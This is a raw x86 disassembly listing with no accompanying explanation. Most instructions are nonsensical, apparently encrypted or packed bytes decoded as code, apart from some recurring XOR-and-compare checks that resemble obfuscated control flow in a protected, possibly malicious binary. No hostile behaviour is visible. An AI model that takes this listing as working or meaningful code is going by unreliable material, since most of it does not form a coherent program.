  40b525:	and    BYTE PTR [ecx+0x188c911f],0x44
  40b52c:	cli    
  40b52d:	stos   DWORD PTR es:[edi],eax
  40b52e:	or     ch,ch
  40b530:	rcl    dl,cl
  40b532:	in     al,dx
  40b533:	pop    ecx
  40b534:	and    BYTE PTR [ecx-0x429f847a],bh
  40b53a:	mov    bh,0x8c
  40b53c:	out    0xee,eax
  40b53e:	(bad)  
  40b53f:	in     eax,dx
  40b540:	cmp    ebp,DWORD PTR [edx]
  40b542:	imul   edx,DWORD PTR [ebp+0x66],0xc9186f9b
  40b549:	cli    
  40b54a:	les    edx,FWORD PTR [ebp+ebp*8-0x38]
  40b54e:	addr16 xchg esp,eax
  40b550:	mov    WORD PTR [ecx+0x24e1648c],fs
  40b556:	mov    WORD PTR [edi-0x5c],ss
  40b559:	inc    ecx
  40b55a:	(bad)  
  40b55b:	loopne 0x40b53f
  40b55d:	mov    eax,0x82b52224
  40b562:	dec    esi
  40b563:	loop   0x40b53d
  40b565:	lds    edx,FWORD PTR [edx+0x61]
  40b568:	lea    edi,[ecx+eax*4]
  40b56b:	cmp    ebx,ecx
  40b56d:	out    0x3a,al
  40b56f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b570:	rcl    esi,cl
  40b572:	push   cs
  40b573:	push   edx
  40b574:	mov    edx,0x16610541
  40b579:	mov    ah,0xa
  40b57b:	push   edx
  40b57c:	call   DWORD PTR gs:[ecx+0x48444322]
  40b583:	les    ebx,FWORD PTR [eax+0xe]
  40b586:	mov    esp,0x6af5438c
  40b58b:	sub    DWORD PTR ds:0x90e5ced0,esp
  40b591:	ja     0x40b5cb
  40b593:	push   eax
  40b594:	push   eax
  40b595:	popa   
  40b596:	mov    dh,0x41
  40b598:	sub    al,0xbd
  40b59a:	outs   dx,DWORD PTR ds:[esi]
  40b59b:	popa   
  40b59c:	imul   ebp,esi,0x6a115fe
  40b5a2:	fimul  WORD PTR [ecx]
  40b5a4:	sar    DWORD PTR [ebx],cl
  40b5a6:	sti    
  40b5a7:	inc    ebp
  40b5a8:	jb     0x40b5bc
  40b5aa:	enterw 0x11eb,0x2f
  40b5af:	popf   
  40b5b0:	sbb    al,0xb5
  40b5b2:	xor    al,0x17
  40b5b4:	mov    gs,WORD PTR [esp+edx*2-0x33]
  40b5b8:	dec    ebp
  40b5b9:	popa   
  40b5ba:	xchg   DWORD PTR [eax],ebx
  40b5bc:	dec    eax
  40b5bd:	push   ss
  40b5be:	push   cs
  40b5bf:	sbb    eax,0xb57f0ae0
  40b5c4:	mov    BYTE PTR [esi+ecx*2],cl
  40b5c7:	pop    ecx
  40b5c8:	mov    cl,0x1
  40b5ca:	shr    DWORD PTR [esi-0x239e1103],cl
  40b5d0:	mov    al,0xf8
  40b5d2:	lods   eax,DWORD PTR ds:[esi]
  40b5d3:	lods   eax,DWORD PTR ds:[esi]
  40b5d4:	sbb    eax,0xd50821b3
  40b5d9:	retf   
  40b5da:	mov    esp,0xad387c7b
  40b5df:	xchg   ebp,eax
  40b5e0:	and    DWORD PTR [ebx+0x73],esp
  40b5e3:	adc    al,0x4b
  40b5e5:	inc    edx
  40b5e6:	pushf  
  40b5e7:	jns    0x40b64c
  40b5e9:	pop    eax
  40b5ea:	dec    esi
  40b5eb:	ja     0x40b613
  40b5ed:	pop    ebp
  40b5ee:	pop    ecx
  40b5ef:	or     eax,0x92b60649
  40b5f4:	repz sub ch,BYTE PTR [ebx+0x66984427]
  40b5fb:	xchg   BYTE PTR [ebx-0x51],dl
  40b5fe:	into   
  40b5ff:	lds    ecx,FWORD PTR [ebp+eax*1+0x5a5126c6]
  40b606:	stc    
  40b607:	or     DWORD PTR [esi+eiz*2],ecx
  40b60a:	fadd   DWORD PTR [esi]
  40b60c:	inc    DWORD PTR [ecx+0x1dba7d74]
  40b612:	lock dec esi
  40b614:	push   0xdb960513
  40b619:	xor    al,0x26
  40b61b:	dec    edx
  40b61c:	sub    al,0x44
  40b61e:	xor    DWORD PTR [esi-0x4f9296ab],0x3e
  40b625:	mov    ebx,0xdfbd1632
  40b62a:	ds push edx
  40b62c:	add    dl,ch
  40b62e:	xor    DWORD PTR [edx-0x3819a1b1],0xbb51a1d1
  40b638:	mov    BYTE PTR [esi+0x29],dh
  40b63b:	cmc    
  40b63c:	sbb    bl,bh
  40b63e:	jle    0x40b692
  40b640:	add    edi,ebp
  40b642:	(bad)  
  40b643:	in     al,dx
  40b644:	rcl    BYTE PTR [edi-0x56],1
  40b647:	and    esp,DWORD PTR [edx]
  40b649:	scas   al,BYTE PTR es:[edi]
  40b64a:	jg     0x40b601
  40b64c:	xchg   edx,eax
  40b64d:	sahf   
  40b64e:	cmp    BYTE PTR ds:0x6aad6308,0x52
  40b655:	test   al,0x2a
  40b657:	inc    ebp
  40b658:	rol    DWORD PTR [ebx+ebx*1],0x1c
  40b65c:	mov    ds:0xe4fdd9f4,eax
  40b661:	pop    edx
  40b662:	or     DWORD PTR [edx+0x77],ecx
  40b665:	mov    bh,0x80
  40b667:	call   FWORD PTR [eax-0xe]
  40b66a:	or     eax,0xe17d383c
  40b66f:	dec    eax
  40b670:	mov    ebx,ebx
  40b672:	into   
  40b673:	xchg   esp,eax
  40b674:	ret    0xd78b
  40b677:	add    ecx,DWORD PTR [esi+0x31a7b594]
  40b67d:	mov    ecx,0xd045cf49
  40b682:	scas   eax,DWORD PTR es:[edi]
  40b683:	jmp    0x40b6e6
  40b685:	lods   eax,DWORD PTR ds:[esi]
  40b686:	lods   al,BYTE PTR ds:[esi]
  40b687:	pop    edi
  40b688:	mov    esi,0x1a0b59f6
  40b68d:	mov    ch,0xde
  40b68f:	call   0xd0da:0xc4a14767
  40b696:	lahf   
  40b697:	rol    DWORD PTR [ecx],1
  40b699:	adc    eax,0xbd6b2e08
  40b69e:	inc    ebx
  40b69f:	mov    edi,0x331648cb
  40b6a4:	movzx  esp,WORD PTR [ebx+0x65]
  40b6a8:	sahf   
  40b6a9:	dec    esi
  40b6aa:	push   ebp
  40b6ab:	lods   eax,DWORD PTR ds:[esi]
  40b6ac:	cmc    
  40b6ad:	jmp    0x3fa10a64
  40b6b2:	add    al,0x21
  40b6b4:	data16 and ch,bh
  40b6b7:	push   0x71b392ee
  40b6bc:	or     bl,BYTE PTR [esi-0x2e]
  40b6bf:	mov    ecx,0xf757db49
  40b6c4:	ror    edi,cl
  40b6c6:	push   0xa892b59
  40b6cb:	enter  0xd04,0x79
  40b6cf:	icebp  
  40b6d0:	dec    eax
  40b6d1:	sahf   
  40b6d2:	cmp    eax,0x85689d89
  40b6d7:	mov    esi,0x8af68e71
  40b6dc:	inc    ebx
  40b6dd:	sbb    al,0x5c
  40b6df:	fist   DWORD PTR [eax+0x7a]
  40b6e2:	xchg   edx,eax
  40b6e3:	sbb    ebx,edi
  40b6e5:	push   0x12af1db9
  40b6ea:	(bad)  
  40b6eb:	mov    ch,0x5b
  40b6ed:	ror    DWORD PTR [edi+0x56],0xf
  40b6f1:	mov    eax,0x98a36a6b
  40b6f6:	inc    ecx
  40b6f7:	fisttp DWORD PTR [esi-0x3]
  40b6fa:	sbb    al,0x66
  40b6fc:	fldenv [eax]
  40b6fe:	inc    ecx
  40b6ff:	lahf   
  40b700:	aas    
  40b701:	sti    
  40b702:	or     al,0xb6
  40b704:	xlat   BYTE PTR ds:[ebx]
  40b705:	popf   
  40b706:	div    BYTE PTR [ebp+eiz*2+0xd]
  40b70a:	mov    ecx,0xaa68a220
  40b70f:	cmp    dh,bh
  40b711:	add    eax,0x61ca58af
  40b716:	adc    eax,0xcddf314c
  40b71b:	mov    eax,ds:0xa9cc9e70
  40b720:	daa    
  40b721:	fidiv  DWORD PTR [ecx-0x32]
  40b724:	fs (bad) 
  40b726:	sti    
  40b727:	dec    eax
  40b728:	fsubr  DWORD PTR [edx]
  40b72a:	mov    esp,0x6a05a69f
  40b72f:	jb     0x40b732
  40b731:	ret    0x5ee3
  40b734:	or     al,0x84
  40b736:	jl     0x40b779
  40b738:	pop    eax
  40b739:	out    dx,al
  40b73a:	jge    0x40b74f
  40b73c:	or     al,0x33
  40b73e:	loope  0x40b750
  40b740:	fwait
  40b741:	retf   0x1272
  40b744:	mov    edx,0x7a8f366a
  40b749:	daa    
  40b74a:	xchg   esi,eax
  40b74b:	mov    cl,0x85
  40b74d:	rol    BYTE PTR [ecx-0x18],cl
  40b750:	lock mov esp,0x11d0af15
  40b756:	xlat   BYTE PTR ds:[ebx]
  40b757:	cmp    ecx,esi
  40b759:	push   DWORD PTR [ebp-0x30]
  40b75c:	push   DWORD PTR [ebp+0xc]
  40b75f:	call   0x410212
  40b764:	mov    eax,DWORD PTR [ebp-0x4]
  40b767:	mov    ecx,DWORD PTR [ebp-0x8]
  40b76a:	xor    eax,0x7510854
  40b76f:	add    eax,ebx
  40b771:	cmp    ecx,eax
  40b773:	jne    0x40b9f9
  40b779:	jmp    0x40b9dc
  40b77e:	mov    edi,0x716ef17f
  40b783:	jo     0x40b7c6
  40b785:	das    
  40b786:	pushf  
  40b787:	dec    edi
  40b788:	je     0x40b75f
  40b78a:	mov    edi,0xb29892ed
  40b78f:	(bad)  
  40b790:	jle    0x40b810
  40b792:	cmp    BYTE PTR [esi+edi*2+0x7e],bh
  40b796:	mov    edi,0x3bb29b2
  40b79b:	mov    cl,0xfa
  40b79d:	pop    esp
  40b79e:	imul   esi,DWORD PTR [ecx-0x421d6219],0x34b7d6e2
  40b7a8:	xchg   esi,eax
  40b7a9:	sbb    dh,dh
  40b7ab:	xor    esp,edx
  40b7ad:	jmp    0x709e2ead
  40b7b2:	push   edx
  40b7b3:	jns    0x40b7ab
  40b7b5:	or     cl,bh
  40b7b7:	add    BYTE PTR [eax+0x3f6dfca5],0x4f
  40b7be:	and    DWORD PTR [ebx+0x487ef2],esi
  40b7c4:	js     0x40b7b7
  40b7c6:	stos   DWORD PTR es:[edi],eax
  40b7c7:	cli    
  40b7c8:	pop    ebx
  40b7c9:	cmp    ch,BYTE PTR [eax]
  40b7cb:	mov    ah,0x9f
  40b7cd:	or     eax,0x115344f5
  40b7d2:	jg     0x40b825
  40b7d4:	xchg   ecx,eax
  40b7d5:	xchg   esp,eax
  40b7d6:	xchg   esi,eax
  40b7d7:	sub    BYTE PTR [ebx],dh
  40b7d9:	adc    sp,di
  40b7dc:	in     al,dx
  40b7dd:	xchg   ecx,eax
  40b7de:	jb     0x40b824
  40b7e0:	mov    ecx,0xb8b0c573
  40b7e5:	call   0xc412:0x61749416
  40b7ec:	leave  
  40b7ed:	std    
  40b7ee:	inc    ebx
  40b7ef:	xchg   BYTE PTR [ecx-0x7],al
  40b7f2:	and    eax,0xf8c79f5c
  40b7f7:	gs pop edx
  40b7f9:	mov    ch,0x32
  40b7fb:	scas   eax,DWORD PTR es:[edi]
  40b7fc:	cmp    BYTE PTR [ebp+0x2e],ah
  40b7ff:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b800:	add    DWORD PTR [ecx],0xffffffa8
  40b803:	mov    ecx,0x37a29a65
  40b808:	iret   
  40b809:	in     eax,0x1c
  40b80b:	mov    esi,0xe7e4349b
  40b810:	and    ah,BYTE PTR [ecx+ebx*4+0x12bea28]
  40b817:	daa    
  40b818:	pop    esp
  40b819:	or     eax,0xa3e648da
  40b81e:	jg     0x40b839
  40b820:	outs   dx,BYTE PTR ds:[esi]
  40b821:	adc    BYTE PTR [ecx+0x32],ch
  40b824:	lds    edx,FWORD PTR [eax-0x4b]
  40b827:	popf   
  40b828:	in     eax,0x58
  40b82a:	sub    al,bl
  40b82c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b82d:	jae    0x40b8ae
  40b82f:	add    ebp,DWORD PTR [eax-0x5e807d6d]
  40b835:	add    edi,DWORD PTR ds:0x42b53e18
  40b83b:	in     al,dx
  40b83c:	pop    esi
  40b83d:	or     dl,BYTE PTR [eax-0x68]
  40b840:	xchg   esp,eax
  40b841:	push   0x61
  40b843:	xchg   DWORD PTR [eax-0x62],eax
  40b846:	cld    
  40b847:	jle    0x40b871
  40b849:	adc    cl,ch
  40b84b:	sub    eax,0xe129101e
  40b850:	ds sub eax,0x7db8f21f
  40b856:	jecxz  0x40b81e
  40b858:	xor    eax,esp
  40b85a:	mov    bh,0x97
  40b85c:	out    0x7b,eax
  40b85e:	inc    edi
  40b85f:	or     DWORD PTR [eax],ecx
  40b861:	cdq    
  40b862:	xor    BYTE PTR [eax+0x43],al
  40b865:	sbb    eax,0xa395a3e2
  40b86a:	push   edi
  40b86b:	jno    0x40b8a8
  40b86d:	mov    ebx,0xe0383eaa
  40b872:	loopne 0x40b850
  40b874:	mov    edx,DWORD PTR [ebx+eiz*8]
  40b877:	jne    0x40b845
  40b879:	mov    esi,0xeccb88ee
  40b87e:	gs and eax,ebp
  40b881:	mov    ah,0xfb
  40b883:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b884:	fistp  QWORD PTR [esi-0xe]
  40b887:	mov    dh,0x38
  40b889:	adc    eax,0xefeb7487
  40b88e:	jae    0x40b831
  40b890:	daa    
  40b891:	stos   BYTE PTR es:[edi],al
  40b892:	mov    dh,0x20
  40b894:	fdivp  st(0),st
  40b896:	adc    dh,0x24
  40b899:	iret   
  40b89a:	add    DWORD PTR [ebx+0x7b6bc679],ecx
  40b8a0:	std    
  40b8a1:	xchg   BYTE PTR [edx+0x59397381],bl
  40b8a7:	or     al,bh
  40b8a9:	int3   
  40b8aa:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b8ab:	jmp    0x98c1428d
  40b8b0:	sar    edi,1
  40b8b2:	sub    BYTE PTR [edx],bl
  40b8b4:	pop    edi
  40b8b5:	es mov dl,0x7d
  40b8b8:	jo     0x40b936
  40b8ba:	push   esp
  40b8bb:	adc    eax,0x58c4ccdb
  40b8c0:	pop    ss
  40b8c1:	cdq    
  40b8c2:	xchg   ebx,eax
  40b8c3:	mov    ecx,0xe8028705
  40b8c8:	or     eax,DWORD PTR [eax]
  40b8ca:	sbb    BYTE PTR [esp+ecx*4-0x1b],dl
  40b8ce:	push   0xffffff9e
  40b8d0:	ficom  WORD PTR [edx+0x74]
  40b8d3:	sar    BYTE PTR [ecx+0x107028a7],cl
  40b8d9:	jge    0x40b863
  40b8db:	sub    al,0xdf
  40b8dd:	pop    esp
  40b8de:	pop    ss
  40b8df:	add    BYTE PTR [ebx],0x85
  40b8e2:	sbb    dh,BYTE PTR [ebp-0xc6622a]
  40b8e8:	daa    
  40b8e9:	cdq    
  40b8ea:	jne    0x40b957
  40b8ec:	mov    eax,ds:0x14bcd672
  40b8f1:	jae    0x40b905
  40b8f3:	jbe    0x40b946
  40b8f5:	ds repnz inc eax
  40b8f8:	add    ebx,ebx
  40b8fa:	push   ebp
  40b8fb:	imul   edx,DWORD PTR [ebp-0x37250c99],0x412f2b66
  40b905:	and    DWORD PTR ds:[edx],ebp
  40b908:	and    eax,DWORD PTR [edx+0x38]
  40b90b:	inc    bp
  40b90d:	pop    ebx
  40b90e:	clc    
  40b90f:	arpl   WORD PTR [eax-0x6c],di
  40b912:	dec    ecx
  40b913:	daa    
  40b914:	push   esi
  40b915:	je     0x40b90c
  40b917:	test   BYTE PTR [eax],0x2e
  40b91a:	frstor [ebx+0x51]
  40b91d:	lock out dx,eax
  40b91f:	mov    ch,0x15
  40b921:	mov    fs,WORD PTR [edx-0xb]
  40b924:	in     al,dx
  40b925:	or     al,BYTE PTR ds:[ecx]
  40b928:	add    edx,ebp
  40b92a:	xchg   ecx,eax
  40b92b:	daa    
  40b92c:	inc    edi
  40b92d:	push   edx
  40b92e:	dec    esp
  40b92f:	in     eax,dx
  40b930:	daa    
  40b931:	dec    edi
  40b932:	mov    dl,0x5
  40b934:	fcmovnb st,st(5)
  40b936:	sbb    al,0x9f
  40b938:	xchg   DWORD PTR [esi],ebx
  40b93a:	xchg   ebx,eax
  40b93b:	or     BYTE PTR [edx+0x4e4e985b],0x73
  40b942:	sbb    eax,0x82a769ae
  40b947:	inc    ecx
  40b948:	add    ecx,DWORD PTR [ebx+0x5f]
  40b94b:	push   esi
  40b94c:	mov    BYTE PTR [ebp+0x79],ah
  40b94f:	jb     0x40b95c
  40b951:	(bad)  
  40b952:	xor    dh,BYTE PTR [esi-0x13]
  40b955:	adc    eax,0xe117543c
  40b95a:	dec    ebp
  40b95b:	push   edi
  40b95c:	aaa    
  40b95d:	ds in  al,dx
  40b95f:	cmp    BYTE PTR [ebx+ebx*4],bh
  40b962:	test   al,bl
  40b964:	dec    esp
  40b965:	ds xchg edi,eax
  40b967:	push   cs
  40b968:	popa   
  40b969:	repz or al,0x56
  40b96c:	jecxz  0x40b918
  40b96e:	mov    al,ds:0x9acb425f
  40b973:	into   
  40b974:	pop    edi
  40b975:	nop
  40b976:	rol    BYTE PTR ds:0x824b3e43,1
  40b97c:	ret    0xdcc0
  40b97f:	es jo  0x40b9e1
  40b982:	movlps QWORD PTR [eax+0x5],xmm3
  40b986:	outs   dx,BYTE PTR ds:[esi]
  40b987:	or     DWORD PTR [eax],edi
  40b989:	mov    ch,0xe
  40b98b:	pop    esi
  40b98c:	dec    esp
  40b98d:	dec    ebx
  40b98e:	retf   
  40b98f:	(bad)  
  40b990:	ins    BYTE PTR es:[edi],dx
  40b991:	test   BYTE PTR [edi+0x71a0678f],0xe3
  40b998:	clc    
  40b999:	inc    ecx
  40b99a:	jb     0x40ba0d
  40b99c:	cwde   
  40b99d:	int3   
  40b99e:	out    0x5f,eax
  40b9a0:	iret   
  40b9a1:	shl    BYTE PTR [ebx],0x37
  40b9a4:	in     al,dx
  40b9a5:	mov    WORD PTR [edx+0x7ef17643],ss
  40b9ab:	xor    ebx,DWORD PTR ds:0x845ac286
  40b9b1:	out    0x48,eax
  40b9b3:	jge    0x40ba04
  40b9b5:	sbb    DWORD PTR [ebx],ebx
  40b9b7:	test   eax,0x9ef21793
  40b9bc:	cld    
  40b9bd:	test   BYTE PTR [edi+0x131493b2],0x2
  40b9c4:	sbb    dh,BYTE PTR [edi+0xb6e4c97]
  40b9ca:	lods   eax,DWORD PTR ds:[esi]
  40b9cb:	or     dh,BYTE PTR [edx+0x18]
  40b9ce:	mov    ch,0x29
  40b9d0:	imul   ebx,ebp,0xfffffff0
  40b9d3:	bound  esi,QWORD PTR [esi+edx*1-0x53]
  40b9d7:	lds    ebx,FWORD PTR [ecx-0x74a21c96]
  40b9dd:	inc    ebp
  40b9de:	loopne 0x40ba27
  40b9e0:	cmp    edi,eax
  40b9e2:	jb     0x40a46c
  40b9e8:	jmp    0x40bc6c
  40b9ed:	mov    eax,DWORD PTR [ebp-0x4]
  40b9f0:	xor    eax,esi
  40b9f2:	add    eax,ebx
  40b9f4:	jmp    0x40d598
  40b9f9:	mov    eax,DWORD PTR [ebp-0x2c]
  40b9fc:	jmp    0x40bc5f
  40ba01:	test   BYTE PTR [ecx],ch
  40ba03:	popa   
  40ba04:	lahf   
  40ba05:	jno    0x40ba7e
  40ba07:	inc    eax
  40ba08:	xor    DWORD PTR [edi+ebp*8+0x323a808],eax
  40ba0f:	mov    dh,0xa8
  40ba11:	jl     0x40ba10
  40ba13:	jle    0x40ba93
  40ba15:	cmp    BYTE PTR [esi+edi*2+0x7e],bh
  40ba19:	add    BYTE PTR [ebx+edx*2],dh
  40ba1c:	inc    esi
  40ba1d:	push   esi
  40ba1e:	dec    eax
  40ba1f:	int3   
  40ba20:	xor    al,0x3
  40ba22:	push   ebp
  40ba23:	fcmovne st,st(1)
  40ba25:	or     eax,0x90173a98
  40ba2a:	add    esp,edi
  40ba2c:	aas    
  40ba2d:	out    0x32,al
  40ba2f:	adc    bl,BYTE PTR [edx]
  40ba31:	arpl   WORD PTR [ecx],di
  40ba33:	pushf  
  40ba34:	retf   
  40ba35:	repz frstor [ebx+0x57]
  40ba39:	add    al,0x42
  40ba3b:	cmp    eax,0xce9348df
  40ba40:	xchg   esi,eax
  40ba41:	sbb    BYTE PTR [eax+0x42b376f1],0x7d
  40ba48:	jmp    0x40ba9c
  40ba4a:	int    0x7f
  40ba4c:	push   edx
  40ba4d:	mov    es,WORD PTR es:[edx]
  40ba50:	shl    DWORD PTR [ebp-0x58fc0535],0x47
  40ba57:	loopne 0x40ba0e
  40ba59:	les    edi,FWORD PTR [esi+0x56]
  40ba5c:	cdq    
  40ba5d:	hlt    
  40ba5e:	inc    esi
  40ba5f:	dec    edx
  40ba60:	inc    DWORD PTR [edi]
  40ba62:	in     al,dx
  40ba63:	arpl   WORD PTR [ecx+0x49e77a17],ax
  40ba69:	sub    eax,ebx
  40ba6b:	sbb    bl,BYTE PTR [ebp+edx*8-0x10]
  40ba6f:	mov    cl,0xbb
  40ba71:	pop    es
  40ba72:	xor    BYTE PTR [ecx-0x22b548e8],al
  40ba78:	add    BYTE PTR [eax+0x56],dl
  40ba7b:	xchg   edi,eax
  40ba7c:	enter  0x6cdc,0x78
  40ba80:	bound  ebx,QWORD PTR [edi-0x3a]
  40ba83:	pusha  
  40ba84:	xchg   ecx,eax
  40ba85:	lock xor eax,0x3067bba7
  40ba8b:	or     ah,cl
  40ba8d:	call   0x7479:0x561070b0
  40ba94:	mov    eax,ds:0x11d9c479
  40ba99:	jae    0x40ba4d
  40ba9b:	mov    al,ds:0xd8484609
  40baa0:	jmp    0xd6aa:0x983e4e98
  40baa7:	push   ecx
  40baa8:	jne    0x40badc
  40baaa:	ss pop ebx
  40baac:	and    eax,0xa02e7d15
  40bab1:	int3   
  40bab2:	adc    cl,dh
  40bab4:	lds    esp,FWORD PTR [ecx-0x44]
  40bab7:	cmp    DWORD PTR [esi],edi
  40bab9:	(bad)  
  40baba:	ret    
  40babb:	sub    BYTE PTR [eax],bl
  40babd:	sub    DWORD PTR [esi-0x23],edi
  40bac0:	inc    esi
  40bac1:	push   edi
  40bac2:	scas   al,BYTE PTR es:[edi]
  40bac3:	je     0x40bb3a
  40bac5:	inc    esi
  40bac6:	pop    esp
  40bac7:	push   ecx
  40bac8:	fcom   st(1)
  40baca:	cmp    eax,0x840d0e58
  40bacf:	aam    0x27
  40bad1:	or     al,0x6b
  40bad3:	mov    dl,0xa4
  40bad5:	mov    DWORD PTR [ecx+0x4a708f8],ecx
  40badb:	iret   
  40badc:	inc    edx
  40badd:	dec    edi
  40bade:	and    al,0xaa
  40bae0:	inc    edi
  40bae1:	icebp  
  40bae2:	bnd jnp 0x40baf2
  40bae5:	dec    esp
  40bae6:	dec    ecx
  40bae7:	xchg   esi,eax
  40bae8:	lock rcl DWORD PTR [eax+ecx*2],1
  40baec:	jae    0x40bb40
  40baee:	adc    al,0x52
  40baf0:	jmp    0x40ba89
  40baf2:	jmp    0x40bb0a
  40baf4:	idiv   BYTE PTR cs:[edx+0x66e3a47b]
  40bafb:	xor    eax,0x8acf697b
  40bb00:	mov    cl,0xca
  40bb02:	adc    BYTE PTR [esi-0x3d],dl
  40bb05:	xchg   ecx,eax
  40bb06:	and    BYTE PTR [eax],bh
  40bb08:	neg    cl
  40bb0a:	fnsave [eax]
  40bb0c:	sbb    al,0x3c
  40bb0e:	push   0x54
  40bb10:	pop    ebx
  40bb11:	(bad)
  40bb14:	mov    dl,0x1c
  40bb16:	dec    esi
  40bb17:	sbb    BYTE PTR [edx-0x53a65ca7],al
  40bb1d:	es xor al,0x95
  40bb20:	jb     0x40bb18
  40bb22:	ins    DWORD PTR es:[edi],dx
  40bb23:	hlt    
  40bb24:	add    edx,DWORD PTR [ecx-0x1e8649c4]
  40bb2a:	sub    BYTE PTR [edx],0x81
  40bb2d:	jmp    0x2918291b
  40bb32:	lahf   
  40bb33:	in     al,dx
  40bb34:	cld    
  40bb35:	push   esp
  40bb36:	out    dx,eax
  40bb37:	stos   DWORD PTR es:[edi],eax
  40bb38:	shl    BYTE PTR [ecx],1
  40bb3a:	es mov cl,0x38
  40bb3d:	mov    ?,WORD PTR [edx+eax*4-0x3a]
  40bb41:	out    0xb3,eax
  40bb43:	sub    eax,0xe8b91ac1
  40bb48:	fbstp  TBYTE PTR [ebx]
  40bb4a:	loope  0x40bb9e
  40bb4c:	pusha  
  40bb4d:	idiv   DWORD PTR [ecx+0x22]
  40bb50:	dec    edx
  40bb51:	inc    edi
  40bb52:	lods   eax,DWORD PTR ds:[esi]
  40bb53:	push   ebp
  40bb54:	pop    ecx
  40bb55:	mov    ecx,eax
  40bb57:	pop    edx
  40bb58:	in     eax,0x7a
  40bb5a:	sbb    al,0xbf
  40bb5c:	sbb    ah,dl
  40bb5e:	into   
  40bb5f:	jno    0x40bbc8
  40bb61:	jb     0x40bb94
  40bb63:	jmp    0x40bba9
  40bb65:	sub    eax,0xe5eeb9a3
  40bb6a:	mov    esi,0x50c8ab50
  40bb6f:	stos   DWORD PTR es:[edi],eax
  40bb70:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bb71:	sbb    bh,al
  40bb73:	pop    esp
  40bb74:	mov    esi,0xe7be2ecf
  40bb79:	and    al,0x41
  40bb7b:	fmul   st(1),st
  40bb7d:	inc    esp
  40bb7e:	sub    DWORD PTR [edx+0x45f2f961],edx
  40bb84:	add    ah,BYTE PTR [ecx-0x79]
  40bb87:	cwde   
  40bb88:	mov    ?,WORD PTR [esi+0x33]
  40bb8b:	aaa    
  40bb8c:	push   edi
  40bb8d:	or     al,0x4
  40bb8f:	xchg   edi,eax
  40bb90:	stos   DWORD PTR es:[edi],eax
  40bb91:	lods   eax,DWORD PTR ds:[esi]
  40bb92:	jp     0x40bbf9
  40bb94:	leave  
  40bb95:	ss out 0xbf,al
  40bb98:	lock jmp 0x9bd78445
  40bb9e:	mov    BYTE PTR [ebx-0x7e7d774e],cl
  40bba4:	dec    edx
  40bba5:	dec    esp
  40bba6:	mov    dl,0xba
  40bba8:	xor    eax,0xd821aa10
  40bbad:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bbae:	inc    ecx
  40bbaf:	jbe    0x40bba7
  40bbb1:	mov    ecx,0xdac92a1
  40bbb6:	or     ah,BYTE PTR [ecx+eax*1]
  40bbb9:	loope  0x40bc24
  40bbbb:	ficomp DWORD PTR [edi+0x5c8797ee]
  40bbc1:	inc    ebp
  40bbc2:	adc    BYTE PTR [ebp+0x63],ch
  40bbc5:	mov    al,ds:0x2eb19d39
  40bbca:	aad    0xcf
  40bbcc:	pop    ebp
  40bbcd:	shr    BYTE PTR [ecx+0x4c],0x9d
  40bbd1:	add    BYTE PTR [ecx+ebp*8],bh
  40bbd4:	imul   ebp,edi,0x7aa19887
  40bbda:	or     BYTE PTR [edi+ecx*2+0x4507595],bl
  40bbe1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bbe2:	js     0x40bb74
  40bbe4:	cmc    
  40bbe5:	(bad)  
  40bbe6:	jmp    0x40bbb1
  40bbe8:	sub    eax,0xfc3dc4ad
  40bbed:	jg     0x40bc65
  40bbef:	arpl   WORD PTR [eax],di
  40bbf1:	push   ecx
  40bbf2:	lods   eax,DWORD PTR ds:[esi]
  40bbf3:	(bad)  
  40bbf4:	stos   BYTE PTR es:[edi],al
  40bbf5:	jb     0x40bc12
  40bbf7:	out    0x27,eax
  40bbf9:	nop
  40bbfa:	int    0xa8
  40bbfc:	jns    0x40bb9a
  40bbfe:	mov    ebp,ss
  40bc00:	in     eax,0xd5
  40bc02:	push   esi
  40bc03:	add    bl,BYTE PTR [esi]
  40bc05:	test   dl,ah
  40bc07:	imul   esp,DWORD PTR [edi],0xd6290aff
  40bc0d:	ret    0x101f
  40bc10:	ret    
  40bc11:	xchg   esi,eax
  40bc12:	push   0xcebf9d1d
  40bc17:	iret   
  40bc18:	cmp    al,cl
  40bc1a:	das    
  40bc1b:	adc    esi,DWORD PTR [edi]
  40bc1d:	in     al,dx
  40bc1e:	mov    al,ds:0x738dbc99
  40bc23:	push   ebx
  40bc24:	ror    dl,0x4b
  40bc27:	add    DWORD PTR [eax-0x65be7b2f],ebx
  40bc2d:	jge    0x40bc8f
  40bc2f:	inc    edx
  40bc30:	cmp    eax,0xdd02b254
  40bc35:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bc36:	dec    esi
  40bc37:	loope  0x40bbd9
  40bc39:	mov    eax,0x3237e26e
  40bc3e:	push   ebp
  40bc3f:	inc    esp
  40bc40:	cmp    DWORD PTR [eax],edx
  40bc42:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bc43:	xchg   edi,eax
  40bc44:	stc    
  40bc45:	sbb    ebx,edi
  40bc47:	xchg   ecx,eax
  40bc48:	xchg   dl,dh
  40bc4a:	fsub   DWORD PTR [esi-0x42]
  40bc4d:	aas    
  40bc4e:	cmp    ecx,DWORD PTR [edi+0x1b]
  40bc51:	add    ch,BYTE PTR [ecx-0x28501d43]
  40bc57:	(bad)  
  40bc58:	in     al,dx
  40bc59:	cmp    bl,BYTE PTR [edx-0x2b]
  40bc5c:	int3   
  40bc5d:	mov    ebx,0x4b70fc2
  40bc62:	js     0x40bbef
  40bc64:	dec    ebp
  40bc65:	in     al,dx
  40bc66:	mov    eax,DWORD PTR [ecx+eax*4]
  40bc69:	mov    DWORD PTR [ebp+0xc],eax
  40bc6c:	mov    eax,DWORD PTR [ebp-0x4]
  40bc6f:	mov    ecx,DWORD PTR [ebp-0x8]
  40bc72:	xor    eax,0x7510854
  40bc77:	add    eax,ebx
  40bc79:	cmp    ecx,eax
  40bc7b:	jne    0x40bef1
  40bc81:	mov    eax,DWORD PTR [ebp-0x4]
  40bc84:	jmp    0x40bee7
  40bc89:	into   
  40bc8a:	mov    esp,0xb26ca26c
  40bc8f:	shl    BYTE PTR [eax+0x17],1
  40bc92:	stos   DWORD PTR es:[edi],eax
